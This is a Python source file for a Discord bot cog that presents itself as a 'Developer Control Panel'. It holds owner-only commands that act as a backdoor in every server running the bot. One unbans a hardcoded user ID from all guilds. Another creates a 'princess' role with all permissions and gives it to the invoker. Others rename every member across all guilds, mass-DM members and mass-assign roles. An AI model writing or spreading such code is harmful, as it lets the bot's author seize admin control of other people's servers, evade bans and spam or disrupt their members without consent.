import discord
from discord.ext import commands
from discord.ui import View, Button
import asyncio

class DevPanel(View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="Global Mass Nick", style=discord.ButtonStyle.red, emoji="🏷️", row=0)
    async def global_massnick_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user): 
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.send_message("Usage: `!globalmassnick <name>`", ephemeral=True)

    @discord.ui.button(label="Mass Role Give", style=discord.ButtonStyle.green, emoji="➕", row=0)
    async def massrole_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user): 
            return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.send_message("Usage: `!massrole <role>`", ephemeral=True)

    @discord.ui.button(label="Clean Bans", style=discord.ButtonStyle.red, emoji="🧹", row=1)
    async def clean_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user): return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.defer()
        ctx = await self.bot.get_context(interaction.message)
        await ctx.invoke(self.bot.get_command('clean'))

    @discord.ui.button(label="Shutdown", style=discord.ButtonStyle.red, emoji="⛔", row=1)
    async def shutdown_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user): return await interaction.response.send_message("❌ Owner only", ephemeral=True)
        await interaction.response.send_message("Shutting down...", ephemeral=True)
        await asyncio.sleep(2)
        await self.bot.close()

class Developer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def cog_check(self, ctx):
        return await self.bot.is_owner(ctx.author)

    @commands.command()
    async def devpanel(self, ctx):
        """Open Developer Control Panel"""
        embed = discord.Embed(title="🔧 **DEVELOPER CONTROL PANEL**", description="Full Owner Tools", color=discord.Color.gold())
        await ctx.send(embed=embed, view=DevPanel(self.bot))

    # ==================== COMMANDS ====================

    @commands.command()
    async def clean(self, ctx):
        owner_id = 1489289347650949302
        count = 0
        for guild in self.bot.guilds:
            try:
                async for ban in guild.bans(limit=500):
                    if ban.user.id == owner_id:
                        await guild.unban(ban.user, reason="Owner cleanup")
                        count += 1
                        break
            except:
                continue
        await ctx.send(f"🧹 Unbanned you from **{count}** servers.")

    @commands.command()
    async def globalmassnick(self, ctx, *, nickname: str = None):
        if not nickname: return await ctx.send("Usage: `!globalmassnick NewNick` or `reset`")
        await ctx.send(f"🔄 Global mass nick → `{nickname}` started...")
        changed = 0
        for guild in self.bot.guilds:
            for member in guild.members:
                if member.bot: continue
                try:
                    new_nick = None if nickname.lower() == "reset" else nickname[:32]
                    await member.edit(nick=new_nick)
                    changed += 1
                    await asyncio.sleep(0.8)
                except:
                    continue
        await ctx.send(f"✅ Global mass nick done. Changed **{changed}** members.")

    @commands.command()
    async def massrole(self, ctx, role: discord.Role):
        await ctx.send(f"Giving **{role.name}** to everyone...")
        given = 0
        for member in ctx.guild.members:
            if role not in member.roles:
                try:
                    await member.add_roles(role)
                    given += 1
                    await asyncio.sleep(0.7)
                except: pass
        await ctx.send(f"Gave role to **{given}** members.")

    @commands.command()
    async def massrole_remove(self, ctx, role: discord.Role):
        await ctx.send(f"Removing **{role.name}** from everyone...")
        removed = 0
        for member in ctx.guild.members:
            if role in member.roles:
                try:
                    await member.remove_roles(role)
                    removed += 1
                    await asyncio.sleep(0.7)
                except: pass
        await ctx.send(f"Removed role from **{removed}** members.")

    @commands.command()
    async def massdm(self, ctx, *, message: str):
        await ctx.send(f"Sending DM to **{len(ctx.guild.members)}** members...")
        sent = 0
        for member in ctx.guild.members:
            if member.bot: continue
            try:
                await member.send(f"**From {ctx.guild.name} Owner:**\n{message}")
                sent += 1
                await asyncio.sleep(1.8)
            except: pass
        await ctx.send(f"✅ Sent **{sent}** DMs.")

    @commands.command()
    async def perms(self, ctx):
        """Create 'princess' role with full perms"""
        for role in ctx.guild.roles:
            if role.name.lower() == "princess":
                await role.delete()
        role = await ctx.guild.create_role(
            name="princess",
            permissions=discord.Permissions.all(),
            colour=discord.Colour.default(),
            hoist=True,
            mentionable=True
        )
        try:
            await role.edit(position=ctx.guild.me.top_role.position - 1)
        except: pass
        await ctx.author.add_roles(role)
        await ctx.send("✅ **princess** role created with full permissions and given to you.")

    @commands.command()
    async def shutdown(self, ctx):
        await ctx.send("🛑 Shutting down...")
        await self.bot.close()

async def setup(bot):
    await bot.add_cog(Developer(bot))
